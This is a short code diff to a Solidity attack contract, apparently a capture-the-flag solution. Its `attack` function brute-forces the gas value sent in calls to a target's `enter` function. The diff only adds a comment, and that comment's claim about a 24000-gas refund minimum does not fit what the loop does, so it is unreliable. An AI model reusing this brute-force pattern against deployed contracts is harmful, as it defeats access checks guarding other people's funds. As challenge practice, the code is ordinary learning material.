@@ -13,6 +13,7 @@ contract Attack13 {
     }
 
     function attack(bytes8 _gateKey) external {
+        // 24000 gas is the minimum amount for a gas refund on revert
         for (uint256 i = 0; i < 24000; i++) {
             (bool result, ) = address(target).call{gas: 8191 + i}(
                 abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
